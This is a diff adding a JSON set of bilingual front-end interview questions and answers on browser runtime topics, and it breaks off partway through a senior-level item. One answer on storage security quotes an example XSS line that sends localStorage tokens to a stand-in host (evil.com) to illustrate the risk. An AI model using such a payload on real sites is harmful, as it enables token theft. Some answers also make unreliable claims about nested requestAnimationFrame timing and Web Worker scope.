@@ -1,1 +1,666 @@
-[]
+[
+  {
+    "id": "browser-runtime-q-1",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "Explain the difference between event bubbling and event capturing. How do you prevent event bubbling?",
+      "ru": "Объясните разницу между всплытием событий и захватом событий. Как предотвратить всплытие события?"
+    },
+    "answer": {
+      "en": "### Event Bubbling vs Capturing\n\nEvent capturing flows down from root to target, while bubbling flows up from target to root. You can prevent bubbling with `stopPropagation()` or handle events in capture phase by setting the third parameter to `true`.\n\n```typescript\nconst element = document.getElementById('child');\n\n// Prevent bubbling\nelement.addEventListener('click', (e) => {\n  e.stopPropagation();\n  console.log('Event stopped');\n});\n\n// Capture phase instead of bubbling\nelement.addEventListener('click', (e) => {\n  console.log('Capture phase');\n}, true);\n```\n\n**Common interview trap:** Beginners often confuse which phase is the default (bubbling is default, not capturing).",
+      "ru": "### Всплытие vs Захват событий\n\nЗахват событий идёт от корня к элементу, всплытие идёт от элемента к корню. Вы можете остановить всплытие с помощью `stopPropagation()` или обработать событие в фазе захвата, установив третий параметр в `true`.\n\n```typescript\nconst element = document.getElementById('child');\n\n// Остановить всплытие\nelement.addEventListener('click', (e) => {\n  e.stopPropagation();\n  console.log('Event stopped');\n});\n\n// Фаза захвата вместо всплытия\nelement.addEventListener('click', (e) => {\n  console.log('Capture phase');\n}, true);\n```\n\n**Типичная ошибка:** Новички часто путают, какая фаза используется по умолчанию (по умолчанию используется всплытие, а не захват)."
+    },
+    "tags": [
+      "event-bubbling",
+      "event-capturing",
+      "event-handling"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-2",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "What is the DOM tree and how does it relate to the HTML structure? Can you explain how to traverse it?",
+      "ru": "Что такое DOM дерево и как оно связано со структурой HTML? Можете ли вы объяснить, как его обходить?"
+    },
+    "answer": {
+      "en": "### DOM Tree Structure\n\nThe DOM tree is a hierarchical representation of HTML elements in memory. Each HTML tag becomes a node, and you can traverse it using properties like `parentNode`, `childNodes`, `nextSibling`, or methods like `querySelector`.\n\n```typescript\nconst parent = document.getElementById('parent');\nconst firstChild = parent.firstChild;\nconst allChildren = parent.children;\n\n// Traverse up the tree\nconst grandparent = parent.parentNode;\n\n// Query-based traversal\nconst descendants = parent.querySelectorAll('span');\n```\n\n**Common interview trap:** Confusing `childNodes` (includes text nodes) with `children` (only element nodes).",
+      "ru": "### Структура DOM дерева\n\nDOM дерево - это иерархическое представление HTML элементов в памяти. Каждый тег HTML становится узлом, и вы можете обходить его, используя свойства типа `parentNode`, `childNodes`, `nextSibling` или методы вроде `querySelector`.\n\n```typescript\nconst parent = document.getElementById('parent');\nconst firstChild = parent.firstChild;\nconst allChildren = parent.children;\n\n// Обход вверх по дереву\nconst grandparent = parent.parentNode;\n\n// Обход на основе запросов\nconst descendants = parent.querySelectorAll('span');\n```\n\n**Типичная ошибка:** Путаница между `childNodes` (включает текстовые узлы) и `children` (только элементы)."
+    },
+    "tags": [
+      "dom-tree",
+      "dom-traversal",
+      "dom-navigation"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-3",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "What are the differences between localStorage, sessionStorage, and cookies? When would you use each?",
+      "ru": "Какие различия между localStorage, sessionStorage и cookies? Когда вы используете каждый из них?"
+    },
+    "answer": {
+      "en": "### Storage Mechanisms Comparison\n\nlocalStorage persists indefinitely, sessionStorage clears on tab close, and cookies have expiration dates and are sent with HTTP requests. Use localStorage for user preferences, sessionStorage for temporary data, and cookies for authentication tokens.\n\n```typescript\n// localStorage - persists forever\nlocalStorage.setItem('theme', 'dark');\n\n// sessionStorage - cleared on tab close\nsessionStorage.setItem('tempData', 'value');\n\n// cookies - sent with requests, can expire\ndocument.cookie = 'token=abc123; expires=Fri, 31 Dec 2024';\n\nconst stored = localStorage.getItem('theme');\n```\n\n**Common interview trap:** Thinking cookies and localStorage have the same persistence rules; cookies expire and are server-aware, localStorage doesn't.",
+      "ru": "### Сравнение механизмов хранения\n\nlocalStorage сохраняется бесконечно, sessionStorage очищается при закрытии вкладки, а cookies имеют сроки истечения и отправляются с HTTP запросами. Используйте localStorage для предпочтений пользователя, sessionStorage для временных данных и cookies для токенов аутентификации.\n\n```typescript\n// localStorage - сохраняется навсегда\nlocalStorage.setItem('theme', 'dark');\n\n// sessionStorage - очищается при закрытии вкладки\nsessionStorage.setItem('tempData', 'value');\n\n// cookies - отправляются с запросами, имеют срок\ndocument.cookie = 'token=abc123; expires=Fri, 31 Dec 2024';\n\nconst stored = localStorage.getItem('theme');\n```\n\n**Типичная ошибка:** Думать, что cookies и localStorage имеют одинаковые правила сохранения; cookies истекают и известны серверу, localStorage не истекает."
+    },
+    "tags": [
+      "localStorage",
+      "sessionStorage",
+      "cookies",
+      "web-storage"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-4",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "Explain what CORS is and why it exists. What happens when a CORS request is blocked?",
+      "ru": "Объясните, что такое CORS и почему он существует. Что происходит, когда CORS запрос блокируется?"
+    },
+    "answer": {
+      "en": "### CORS (Cross-Origin Resource Sharing)\n\nCORS is a security mechanism that restricts browsers from making requests to different domains without permission. It exists to prevent malicious scripts from accessing sensitive data. When blocked, the browser prevents the response from reaching JavaScript code.\n\n```typescript\n// Browser blocks this due to CORS\nfetch('https://api.example.com/data')\n  .then(res => res.json())\n  .catch(err => console.log('CORS blocked'));\n\n// Server fixes it with proper headers\n// Access-Control-Allow-Origin: https://yoursite.com\n// Access-Control-Allow-Methods: GET, POST\n```\n\n**Common interview trap:** Thinking the request never reaches the server; the request is sent but the browser blocks the response.",
+      "ru": "### CORS (Cross-Origin Resource Sharing)\n\nCORS - это механизм безопасности, который ограничивает браузеры от выполнения запросов на разные домены без разрешения. Он существует для предотвращения доступа вредоносных скриптов к чувствительным данным. При блокировке браузер предотвращает доступ ответа к JavaScript коду.\n\n```typescript\n// Браузер блокирует это из-за CORS\nfetch('https://api.example.com/data')\n  .then(res => res.json())\n  .catch(err => console.log('CORS blocked'));\n\n// Сервер исправляет это с правильными заголовками\n// Access-Control-Allow-Origin: https://yoursite.com\n// Access-Control-Allow-Methods: GET, POST\n```\n\n**Типичная ошибка:** Думать, что запрос никогда не доходит до сервера; запрос отправляется, но браузер блокирует ответ."
+    },
+    "tags": [
+      "cors",
+      "cross-origin",
+      "security",
+      "fetch-api"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-5",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "How does the Fetch API work? Write a simple example that handles errors and parses JSON responses.",
+      "ru": "Как работает Fetch API? Напишите простой пример, который обрабатывает ошибки и парсит JSON ответы."
+    },
+    "answer": {
+      "en": "### Fetch API Basics\n\nFetch returns a Promise that resolves with a Response object. You must explicitly call `.json()` to parse the body, and network errors only reject on connection failures, not HTTP error statuses.\n\n```typescript\nfetch('https://api.example.com/user')\n  .then(response => {\n    if (!response.ok) throw new Error(`HTTP ${response.status}`);\n    return response.json();\n  })\n  .then(data => console.log(data))\n  .catch(error => console.error('Error:', error));\n\n// Modern async/await version\nconst fetchUser = async () => {\n  const response = await fetch('https://api.example.com/user');\n  if (!response.ok) throw new Error('Failed to fetch');\n  return response.json();\n};\n```\n\n**Common interview trap:** Forgetting to check `response.ok` or `.status`; a 404 doesn't automatically reject the Promise.",
+      "ru": "### Основы Fetch API\n\nFetch возвращает Promise, который разрешается объектом Response. Вы должны явно вызвать `.json()` для парсинга тела, и сетевые ошибки отклоняются только при сбое соединения, а не при HTTP ошибках.\n\n```typescript\nfetch('https://api.example.com/user')\n  .then(response => {\n    if (!response.ok) throw new Error(`HTTP ${response.status}`);\n    return response.json();\n  })\n  .then(data => console.log(data))\n  .catch(error => console.error('Error:', error));\n\n// Современная версия async/await\nconst fetchUser = async () => {\n  const response = await fetch('https://api.example.com/user');\n  if (!response.ok) throw new Error('Failed to fetch');\n  return response.json();\n};\n```\n\n**Типичная ошибка:** Забыть проверить `response.ok` или `.status`; 404 не автоматически отклоняет Promise."
+    },
+    "tags": [
+      "fetch-api",
+      "promises",
+      "async-await",
+      "error-handling"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-6",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "Explain the difference between event bubbling and event capturing. How would you stop event propagation in each phase?",
+      "ru": "Объясните разницу между всплытием событий и захватом событий. Как остановить распространение события на каждом этапе?"
+    },
+    "answer": {
+      "en": "### Event Bubbling vs Capturing\n\nEvent capturing starts from the window and goes down to the target element, while bubbling goes from the target up to the window. You can control the flow using the third parameter in addEventListener or by calling stopPropagation().\n\n```typescript\n// Capturing phase (third parameter = true)\nelement.addEventListener('click', (e) => {\n  e.stopPropagation(); // Stops propagation\n}, true);\n\n// Bubbling phase (third parameter = false or omitted)\nelement.addEventListener('click', (e) => {\n  e.stopImmediatePropagation(); // Prevents other handlers\n});\n```\n\n**Common interview trap:** Confusing stopPropagation() with preventDefault() — the latter only prevents default browser behavior.",
+      "ru": "### Всплытие и Захват событий\n\nЗахват начинается от окна и идёт вниз к целевому элементу, всплытие идёт от цели вверх к окну. Контролируйте поток через третий параметр addEventListener или stopPropagation().\n\n```typescript\n// Фаза захвата (третий параметр = true)\nelement.addEventListener('click', (e) => {\n  e.stopPropagation(); // Останавливает распространение\n}, true);\n\n// Фаза всплытия (третий параметр = false или опущен)\nelement.addEventListener('click', (e) => {\n  e.stopImmediatePropagation(); // Блокирует другие обработчики\n});\n```\n\n**Типичная ошибка:** Путать stopPropagation() с preventDefault() — второй только отменяет поведение браузера."
+    },
+    "tags": [
+      "event-bubbling",
+      "event-capturing",
+      "event-propagation"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-7",
+    "topicId": "browser-runtime",
+    "difficulty": "junior",
+    "question": {
+      "en": "What are the differences between localStorage, sessionStorage, and cookies? When would you use each one?",
+      "ru": "Какие различия между localStorage, sessionStorage и cookies? Когда использовать каждый из них?"
+    },
+    "answer": {
+      "en": "### Storage Mechanisms Comparison\n\nlocalStorage persists indefinitely, sessionStorage clears on tab close, and cookies expire based on a set date. localStorage and sessionStorage are same-origin only and larger (~5-10MB), while cookies are sent with every HTTP request and smaller (~4KB).\n\n```typescript\n// localStorage - persists forever\nlocalStorage.setItem('user', 'john');\nconsole.log(localStorage.getItem('user')); // 'john'\n\n// sessionStorage - clears on tab close\nsessionStorage.setItem('temp', 'data');\n\n// cookies - sent with requests, use for auth\ndocument.cookie = 'token=abc123; max-age=3600';\n```\n\n**Common interview trap:** Thinking cookies and localStorage have the same scope — cookies are sent to the server, storage isn't.",
+      "ru": "### Сравнение механизмов хранения\n\nlocalStorage сохраняется неопределённо долго, sessionStorage очищается при закрытии вкладки, cookies истекают по установленной дате. localStorage и sessionStorage ограничены одним источником и больше (~5-10MB), cookies отправляются с каждым запросом и меньше (~4KB).\n\n```typescript\n// localStorage - сохраняется навсегда\nlocalStorage.setItem('user', 'john');\nconsole.log(localStorage.getItem('user')); // 'john'\n\n// sessionStorage - очищается при закрытии вкладки\nsessionStorage.setItem('temp', 'data');\n\n// cookies - отправляются на сервер, для авторизации\ndocument.cookie = 'token=abc123; max-age=3600';\n```\n\n**Типичная ошибка:** Думать, что cookies и localStorage имеют одинаковую область — cookies отправляются на сервер, хранилище нет."
+    },
+    "tags": [
+      "localStorage",
+      "sessionStorage",
+      "cookies",
+      "web-storage"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-8",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain event delegation and demonstrate how to handle clicks on dynamically added list items without attaching listeners to each item.",
+      "ru": "Объясните делегирование событий и покажите, как обработать клики на динамически добавленные элементы списка без привязки слушателей к каждому элементу."
+    },
+    "answer": {
+      "en": "### Event Delegation Pattern\n\nEvent delegation leverages event bubbling to handle events on dynamically created elements by attaching a single listener to a parent container. The parent catches events from child elements and uses event.target to identify the specific element that triggered the event.\n\n```typescript\nconst list = document.getElementById('myList');\nlist.addEventListener('click', (event) => {\n  if (event.target.tagName === 'LI') {\n    console.log('Clicked item:', event.target.textContent);\n  }\n});\n// Works for future <li> elements added to list\n```\n\n**Common interview trap:** Forgetting that event delegation only works for events that bubble; some events like focus and load do not bubble.",
+      "ru": "### Паттерн делегирования событий\n\nДелегирование событий использует всплытие событий для обработки событий на динамически созданных элементах путем привязки единственного слушателя к родительскому контейнеру. Родитель перехватывает события от дочерних элементов и использует event.target для определения конкретного элемента.\n\n```typescript\nconst list = document.getElementById('myList');\nlist.addEventListener('click', (event) => {\n  if (event.target.tagName === 'LI') {\n    console.log('Clicked item:', event.target.textContent);\n  }\n});\n// Работает для будущих <li> элементов, добавленных в список\n```\n\n**Типичная ошибка:** Забыть, что делегирование работает только для событий, которые всплывают; события focus и load не всплывают."
+    },
+    "tags": [
+      "event-delegation",
+      "event-bubbling",
+      "dom-optimization"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-9",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "What is the difference between MutationObserver and IntersectionObserver? Provide a use case for each.",
+      "ru": "В чем разница между MutationObserver и IntersectionObserver? Приведите пример использования для каждого."
+    },
+    "answer": {
+      "en": "### MutationObserver vs IntersectionObserver\n\nMutationObserver watches for DOM changes (attributes, text, children), while IntersectionObserver detects when an element becomes visible in the viewport. Use MutationObserver for tracking DOM modifications and IntersectionObserver for lazy loading or visibility tracking.\n\n```typescript\n// MutationObserver: detect DOM changes\nconst observer = new MutationObserver((mutations) => {\n  console.log('DOM changed:', mutations);\n});\nobserver.observe(element, { childList: true, attributes: true });\n\n// IntersectionObserver: detect visibility\nconst io = new IntersectionObserver((entries) => {\n  entries.forEach(e => e.isIntersecting && loadImage(e.target));\n});\nio.observe(lazyImage);\n```\n\n**Common interview trap:** Confusing MutationObserver with IntersectionObserver; MutationObserver does not measure visibility.",
+      "ru": "### MutationObserver vs IntersectionObserver\n\nMutationObserver отслеживает изменения DOM (атрибуты, текст, дочерние элементы), а IntersectionObserver определяет, когда элемент становится видимым в viewport. Используйте MutationObserver для отслеживания изменений DOM и IntersectionObserver для ленивой загрузки или отслеживания видимости.\n\n```typescript\n// MutationObserver: обнаружение изменений DOM\nconst observer = new MutationObserver((mutations) => {\n  console.log('DOM изменился:', mutations);\n});\nobserver.observe(element, { childList: true, attributes: true });\n\n// IntersectionObserver: обнаружение видимости\nconst io = new IntersectionObserver((entries) => {\n  entries.forEach(e => e.isIntersecting && loadImage(e.target));\n});\nio.observe(lazyImage);\n```\n\n**Типичная ошибка:** Путаница между MutationObserver и IntersectionObserver; MutationObserver не измеряет видимость."
+    },
+    "tags": [
+      "mutation-observer",
+      "intersection-observer",
+      "performance-optimization"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-10",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "How do Web Workers improve performance and what are their limitations? Write a simple example.",
+      "ru": "Как Web Workers улучшают производительность и каковы их ограничения? Напишите простой пример."
+    },
+    "answer": {
+      "en": "### Web Workers for Background Processing\n\nWeb Workers run JavaScript on separate threads, preventing main thread blocking during heavy computations. They cannot access the DOM or window object, and communication happens via postMessage with serialization overhead.\n\n```typescript\n// main.js\nconst worker = new Worker('worker.js');\nworker.postMessage({ data: largeArray });\nworker.onmessage = (e) => console.log('Result:', e.data);\n\n// worker.js\nself.onmessage = (e) => {\n  const result = heavyComputation(e.data);\n  self.postMessage(result);\n};\n```\n\n**Common interview trap:** Assuming Web Workers can directly access or modify DOM; they work with data only via message passing.",
+      "ru": "### Web Workers для фоновой обработки\n\nWeb Workers запускают JavaScript на отдельных потоках, предотвращая блокировку основного потока во время тяжелых вычислений. Они не могут получать доступ к DOM или объекту window, а коммуникация происходит через postMessage с сериализацией.\n\n```typescript\n// main.js\nconst worker = new Worker('worker.js');\nworker.postMessage({ data: largeArray });\nworker.onmessage = (e) => console.log('Результат:', e.data);\n\n// worker.js\nself.onmessage = (e) => {\n  const result = heavyComputation(e.data);\n  self.postMessage(result);\n};\n```\n\n**Типичная ошибка:** Предполагать, что Web Workers могут напрямую получать доступ или изменять DOM; они работают только с данными через передачу сообщений."
+    },
+    "tags": [
+      "web-workers",
+      "multi-threading",
+      "performance-optimization"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-11",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain requestAnimationFrame and how it differs from setTimeout for animations. When would you use each?",
+      "ru": "Объясните requestAnimationFrame и чем он отличается от setTimeout для анимаций. Когда использовать каждый?"
+    },
+    "answer": {
+      "en": "### requestAnimationFrame vs setTimeout\n\nrequestAnimationFrame syncs with the browser's refresh rate (60/120 fps), preventing frame drops and reducing jank, while setTimeout fires independently. Use requestAnimationFrame for smooth visual animations and setTimeout for time-based logic or delays.\n\n```typescript\n// requestAnimationFrame: smooth animation\nfunction animate() {\n  element.style.left = currentX + 'px';\n  currentX += speed;\n  requestAnimationFrame(animate);\n}\nanimate();\n\n// setTimeout: time-based action\nsetTimeout(() => console.log('Executed after 1s'), 1000);\n```\n\n**Common interview trap:** Using setTimeout for animations; it can cause janky movement if the callback doesn't align with screen refresh cycles.",
+      "ru": "### requestAnimationFrame vs setTimeout\n\nrequestAnimationFrame синхронизируется с частотой обновления браузера (60/120 fps), предотвращая потерю кадров, в то время как setTimeout срабатывает независимо. Используйте requestAnimationFrame для плавных визуальных анимаций и setTimeout для логики на основе времени или задержек.\n\n```typescript\n// requestAnimationFrame: плавная анимация\nfunction animate() {\n  element.style.left = currentX + 'px';\n  currentX += speed;\n  requestAnimationFrame(animate);\n}\nanimate();\n\n// setTimeout: действие на основе времени\nsetTimeout(() => console.log('Выполнено через 1s'), 1000);\n```\n\n**Типичная ошибка:** Использование setTimeout для анимаций; это может вызвать прерывистое движение, если callback не совпадает с циклами обновления экрана."
+    },
+    "tags": [
+      "request-animation-frame",
+      "animation-performance",
+      "event-loop"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-12",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Discuss Web Storage security (localStorage vs sessionStorage) and explain why storing sensitive data like tokens directly in localStorage is risky.",
+      "ru": "Обсудите безопасность Web Storage (localStorage vs sessionStorage) и объясните, почему хранение чувствительных данных, таких как токены, напрямую в localStorage рискованно."
+    },
+    "answer": {
+      "en": "### Web Storage Security Considerations\n\nlocalStorage persists across sessions and is vulnerable to XSS attacks, while sessionStorage is cleared when the tab closes and offers slightly better security. Sensitive tokens should use httpOnly cookies or in-memory storage to prevent XSS theft, as localStorage is accessible to any script on the page.\n\n```typescript\n// Risky: XSS vulnerability\nlocalStorage.setItem('token', jwtToken); // Vulnerable to: \n// <script>fetch('evil.com?token=' + localStorage.token)</script>\n\n// Better: httpOnly cookie (server-side)\nres.setHeader('Set-Cookie', 'token=jwt; HttpOnly; Secure; SameSite=Strict');\n\n// Alternative: in-memory storage\nlet token = null; // Lost on page refresh but XSS-safe from scripts\n```\n\n**Common interview trap:** Thinking sessionStorage is secure; it's still vulnerable to XSS if accessed during the session. HttpOnly cookies are the standard for auth tokens.",
+      "ru": "### Безопасность Web Storage\n\nlocalStorage сохраняется между сеансами и уязвим для XSS атак, в то время как sessionStorage очищается при закрытии вкладки и предлагает немного лучшую безопасность. Чувствительные токены должны использовать httpOnly cookies или хранилище в памяти, чтобы предотвратить кражу XSS, так как localStorage доступен любому скрипту на странице.\n\n```typescript\n// Рискованно: уязвимость XSS\nlocalStorage.setItem('token', jwtToken); // Уязвимо для:\n// <script>fetch('evil.com?token=' + localStorage.token)</script>\n\n// Лучше: httpOnly cookie (на сервере)\nres.setHeader('Set-Cookie', 'token=jwt; HttpOnly; Secure; SameSite=Strict');\n\n// Альтернатива: хранилище в памяти\nlet token = null; // Потеряется при обновлении, но безопасно от XSS\n```\n\n**Типичная ошибка:** Считать sessionStorage безопасным; он все еще уязвим для XSS во время сеанса. HttpOnly cookies — стандарт для auth токенов."
+    },
+    "tags": [
+      "web-storage",
+      "security",
+      "xss-vulnerability",
+      "token-management"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-13",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain event delegation and show how to handle click events on dynamically added elements without attaching listeners to each one.",
+      "ru": "Объясните делегирование событий и покажите, как обрабатывать клики на динамически добавляемые элементы без привязки обработчиков к каждому."
+    },
+    "answer": {
+      "en": "### Event Delegation Pattern\n\nEvent delegation attaches a single listener to a parent element and uses event bubbling to handle events from child elements. This is efficient for dynamic content since new elements automatically inherit the handler.\n\n```typescript\ndocument.addEventListener('click', (e) => {\n  if (e.target.matches('.btn-delete')) {\n    console.log('Delete:', e.target.dataset.id);\n  }\n});\n```\n\n**Common interview trap:** Forgetting that event delegation relies on event bubbling, which doesn't work with delegated focus/blur events.",
+      "ru": "### Паттерн делегирования событий\n\nДелегирование прикрепляет один обработчик к родительскому элементу и использует всплытие событий для обработки событий дочерних элементов. Это эффективно для динамического контента, так как новые элементы автоматически наследуют обработчик.\n\n```typescript\ndocument.addEventListener('click', (e) => {\n  if (e.target.matches('.btn-delete')) {\n    console.log('Delete:', e.target.dataset.id);\n  }\n});\n```\n\n**Типичная ошибка:** Забыть, что делегирование опирается на всплытие событий, которое не работает с делегированными focus/blur событиями."
+    },
+    "tags": [
+      "event-delegation",
+      "event-bubbling",
+      "dom-manipulation"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-14",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "What is the difference between MutationObserver, IntersectionObserver, and ResizeObserver? When would you use each one?",
+      "ru": "В чем разница между MutationObserver, IntersectionObserver и ResizeObserver? Когда использовать каждый?"
+    },
+    "answer": {
+      "en": "### Observer APIs Comparison\n\nMutationObserver detects DOM tree changes, IntersectionObserver tracks element visibility in viewport, and ResizeObserver monitors element size changes. Choose based on what you need to observe: DOM mutations, visibility, or dimensions.\n\n```typescript\n// MutationObserver - DOM changes\nconst observer = new MutationObserver(() => console.log('DOM changed'));\nobserver.observe(element, { childList: true, subtree: true });\n\n// IntersectionObserver - visibility\nconst io = new IntersectionObserver(entries => {\n  entries.forEach(e => console.log(e.isIntersecting));\n});\nio.observe(element);\n```\n\n**Common interview trap:** Assuming all observers work synchronously—they're asynchronous and batch changes.",
+      "ru": "### Сравнение Observer API\n\nMutationObserver обнаруживает изменения DOM-дерева, IntersectionObserver отслеживает видимость элемента в viewport, ResizeObserver контролирует изменения размера элемента. Выбирайте в зависимости от того, что нужно наблюдать: мутации, видимость или размеры.\n\n```typescript\n// MutationObserver - изменения DOM\nconst observer = new MutationObserver(() => console.log('DOM changed'));\nobserver.observe(element, { childList: true, subtree: true });\n\n// IntersectionObserver - видимость\nconst io = new IntersectionObserver(entries => {\n  entries.forEach(e => console.log(e.isIntersecting));\n});\nio.observe(element);\n```\n\n**Типичная ошибка:** Предположить, что все observer работают синхронно—они асинхронные и группируют изменения."
+    },
+    "tags": [
+      "mutation-observer",
+      "intersection-observer",
+      "resize-observer",
+      "performance-monitoring"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-15",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "How do Web Workers help with performance? What are the limitations when passing data to a Worker?",
+      "ru": "Как Web Workers помогают производительности? Каковы ограничения при передаче данных в Worker?"
+    },
+    "answer": {
+      "en": "### Web Workers for Offload\n\nWeb Workers run JavaScript on a separate thread, preventing UI blocking during heavy computation. Data is copied (structured clone), not shared—you cannot pass functions, DOM references, or circular structures directly.\n\n```typescript\n// Main thread\nconst worker = new Worker('worker.js');\nworker.postMessage({ data: [1, 2, 3] });\nworker.onmessage = (e) => console.log('Result:', e.data);\n\n// Worker thread\nself.onmessage = (e) => {\n  const result = e.data.map(x => x * 2);\n  self.postMessage(result);\n};\n```\n\n**Common interview trap:** Assuming workers can access DOM or global window—they have their own scope with only navigator and setTimeout.",
+      "ru": "### Web Workers для оптимизации\n\nWeb Workers запускают JavaScript в отдельном потоке, предотвращая блокировку UI при тяжелых вычислениях. Данные копируются (structured clone), не делятся—нельзя напрямую передавать функции, ссылки на DOM или циклические структуры.\n\n```typescript\n// Основной поток\nconst worker = new Worker('worker.js');\nworker.postMessage({ data: [1, 2, 3] });\nworker.onmessage = (e) => console.log('Result:', e.data);\n\n// Поток Worker\nself.onmessage = (e) => {\n  const result = e.data.map(x => x * 2);\n  self.postMessage(result);\n};\n```\n\n**Типичная ошибка:** Предположить, что worker может получить доступ к DOM или глобальному window—у них собственная область видимости только с navigator и setTimeout."
+    },
+    "tags": [
+      "web-workers",
+      "threading",
+      "performance-optimization",
+      "structured-clone"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-16",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain how requestAnimationFrame works and why it's better than setTimeout for animations. What happens if you nest multiple rAF calls?",
+      "ru": "Объясните, как работает requestAnimationFrame и почему это лучше setTimeout для анимаций. Что происходит при вложенных вызовах rAF?"
+    },
+    "answer": {
+      "en": "### requestAnimationFrame Benefits\n\nrequestAnimationFrame syncs with the browser's refresh rate (60fps) and is paused when the tab is hidden, saving CPU. setTimeout fires independently, causing jank and wasted cycles. Nested rAF calls execute sequentially in the same frame.\n\n```typescript\n// Good: synced animation\nlet pos = 0;\nfunction animate() {\n  pos += 2;\n  element.style.left = pos + 'px';\n  if (pos < 300) requestAnimationFrame(animate);\n}\nrequestAnimationFrame(animate);\n\n// Bad: independent timer\nsetInterval(() => { element.style.left = (pos++) + 'px'; }, 16);\n```\n\n**Common interview trap:** Thinking nested rAF calls execute in separate frames—they batch in the same frame callback.",
+      "ru": "### Преимущества requestAnimationFrame\n\nrequestAnimationFrame синхронизируется с частотой обновления браузера (60fps) и паузируется когда вкладка скрыта, экономя CPU. setTimeout срабатывает независимо, вызывая jank и потери циклов. Вложенные вызовы rAF выполняются последовательно в одном кадре.\n\n```typescript\n// Хорошо: синхронизированная анимация\nlet pos = 0;\nfunction animate() {\n  pos += 2;\n  element.style.left = pos + 'px';\n  if (pos < 300) requestAnimationFrame(animate);\n}\nrequestAnimationFrame(animate);\n\n// Плохо: независимый таймер\nsetInterval(() => { element.style.left = (pos++) + 'px'; }, 16);\n```\n\n**Типичная ошибка:** Думать, что вложенные rAF вызывают выполняются в отдельных кадрах—они группируются в один кадр callback."
+    },
+    "tags": [
+      "request-animation-frame",
+      "animation",
+      "performance",
+      "frame-timing"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-17",
+    "topicId": "browser-runtime",
+    "difficulty": "middle",
+    "question": {
+      "en": "Compare History API (pushState/replaceState) with Web Storage security. What are the XSS risks with localStorage and how do you mitigate them?",
+      "ru": "Сравните History API (pushState/replaceState) с безопасностью Web Storage. Какие риски XSS с localStorage и как их смягчить?"
+    },
+    "answer": {
+      "en": "### History API vs Web Storage Security\n\nHistory API manipulates the browser history stack without page reload; Web Storage (localStorage/sessionStorage) persists data client-side. localStorage is vulnerable to XSS since any injected script can read/write it—never store sensitive data or trust user input without sanitization.\n\n```typescript\n// History API - safe, no data exposure\nwindow.history.pushState({page: 1}, 'title', '/page1');\n\n// localStorage - XSS vulnerable\nlocalStorage.setItem('token', 'secret'); // Bad!\nconst unsafe = localStorage.getItem('user'); // XSS can steal this\n\n// Better: Use httpOnly cookies for auth tokens\n// Sanitize before storing user input\nconst safe = DOMPurify.sanitize(userInput);\nlocalStorage.setItem('data', safe);\n```\n\n**Common interview trap:** Assuming localStorage is secure because it's client-side—it's equally vulnerable as DOM to XSS attacks.",
+      "ru": "### Безопасность History API vs Web Storage\n\nHistory API манипулирует стеком истории браузера без перезагрузки; Web Storage (localStorage/sessionStorage) сохраняет данные на клиенте. localStorage уязвим для XSS, так как любой внедренный скрипт может читать/писать—никогда не храните чувствительные данные без санитизации.\n\n```typescript\n// History API - безопасен, без утечки данных\nwindow.history.pushState({page: 1}, 'title', '/page1');\n\n// localStorage - уязвим для XSS\nlocalStorage.setItem('token', 'secret'); // Плохо!\nconst unsafe = localStorage.getItem('user'); // XSS может украсть\n\n// Лучше: Используйте httpOnly cookies для токенов\n// Санитизируйте перед сохранением\nconst safe = DOMPurify.sanitize(userInput);\nlocalStorage.setItem('data', safe);\n```\n\n**Типичная ошибка:** Предположить, что localStorage безопасен, потому что находится на клиенте—он одинаково уязвим для XSS как DOM."
+    },
+    "tags": [
+      "history-api",
+      "web-storage",
+      "xss-security",
+      "authentication"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-18",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain the critical rendering path and how you would optimize it for a page with heavy JavaScript execution and multiple render-blocking resources.",
+      "ru": "Объясните критический путь рендеринга и как вы оптимизировали бы его для страницы с интенсивным выполнением JavaScript и несколькими ресурсами, блокирующими рендеринг."
+    },
+    "answer": {
+      "en": "### Critical Rendering Path Optimization\n\nThe critical rendering path includes DOM parsing, CSSOM construction, JavaScript execution, and layout/paint phases. Bottlenecks occur when render-blocking resources block parsing—optimize by deferring JS, minifying CSS, using async/defer attributes, and splitting code.\n\n```typescript\n// Defer non-critical JS, load CSS inline for above-the-fold\n<script src=\"app.js\" defer></script>\n<link rel=\"preload\" as=\"style\" href=\"critical.css\">\n<script async src=\"analytics.js\"></script>\n// Split bundles to load only needed code\nimport(\"./heavy-module.js\").then(mod => mod.init());\n```\n\n**Common interview trap:** Assuming all resources block equally—actually, async scripts don't block parsing, only layout.",
